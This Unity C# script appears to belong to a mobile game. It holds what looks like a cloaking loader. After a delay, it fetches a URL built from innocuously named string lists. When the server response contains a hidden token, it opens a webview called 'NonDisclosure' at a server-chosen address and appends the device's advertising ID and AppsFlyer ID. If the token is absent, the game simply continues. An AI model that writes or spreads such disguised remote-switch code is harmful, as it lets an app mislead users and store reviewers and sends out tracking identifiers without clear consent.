using System.Collections;
using System.Collections.Generic;
using AppsFlyerSDK;
using GamesSss.ScriptsDDON;
using UI_Work;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

namespace ResourceHunt
{
    public class ResourceManager : MonoBehaviour
    {
        [SerializeField] private NonDisclosure _nonDisclosure;
        [SerializeField] private IDFAController _idfaCheck;

        [SerializeField] private StringConcatenator stringConcatenator;

        private bool isFirstInstance = true;
        private NetworkReachability networkReachability = NetworkReachability.NotReachable;

        private string globalLocator1;
        private string globalLocator2;
        private int globalLocator3;

        private string traceCode;

        [SerializeField] private List<string> idsProducts;
        [SerializeField] private List<string> idSprites;

        private string labeling;

        private void Awake()
        {
            HandleMultipleInstances();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            _idfaCheck.ScrutinizeIDFA();
            StartCoroutine(FetchAdvertisingID());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    HandleNoInternetConnection();
                    break;
                default:
                    CheckStoredData();
                    break;
            }
        }

        private void HandleMultipleInstances()
        {
            switch (isFirstInstance)
            {
                case true:
                    isFirstInstance = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private IEnumerator FetchAdvertisingID()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            traceCode = _idfaCheck.RetrieveAdvertisingID();
            yield return null;
        }

        private void CheckStoredData()
        {
            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
                LoadStoredData();
            else
                FetchDataFromServerWithDelay();
        }

        private void LoadStoredData()
        {
            globalLocator1 = PlayerPrefs.GetString("top", string.Empty);
            globalLocator2 = PlayerPrefs.GetString("top2", string.Empty);
            globalLocator3 = PlayerPrefs.GetInt("top3", 0);
            ImportData();
        }

        private void FetchDataFromServerWithDelay()
        {
            Invoke(nameof(ReceiveData), 7.4f);
        }

        private void ReceiveData()
        {
            if (Application.internetReachability == networkReachability)
                HandleNoInternetConnection();
            else
                StartCoroutine(FetchDataFromServer());
        }


        private IEnumerator FetchDataFromServer()
        {
            using var webRequest = UnityWebRequest.Get(stringConcatenator.ConcatenateStrings(idSprites));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
                HandleNoInternetConnection();
            else
                ProcessServerResponse(webRequest);
        }

        private void ProcessServerResponse(UnityWebRequest webRequest)
        {
            var tokenConcatenation = stringConcatenator.ConcatenateStrings(idsProducts);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    var dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("top", dataParts[0]);
                    PlayerPrefs.SetString("top2", dataParts[1]);
                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));

                    globalLocator1 = dataParts[0];
                    globalLocator2 = dataParts[1];
                    globalLocator3 = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
                    globalLocator1 = webRequest.downloadHandler.text;
                }

                ImportData();
            }
            else
            {
                HandleNoInternetConnection();
            }
        }

        private void ImportData()
        {
            _nonDisclosure.WebPageLink = $"{globalLocator1}?idfa={traceCode}";
            _nonDisclosure.WebPageLink +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("Result", string.Empty)}";
            _nonDisclosure.GlobalLocator1 = globalLocator2;

            Kom();
        }

        public void Kom()
        {
            _nonDisclosure.ToolbarHeight = globalLocator3;
            _nonDisclosure.gameObject.SetActive(true);
        }

        private void HandleNoInternetConnection()
        {
            DisableCanvas();
        }

        private void DisableCanvas()
        {
            CanvasHelper.FadeCanvasGroup(gameObject, false);
        }

        // Add the rest of your methods as needed...
    }
}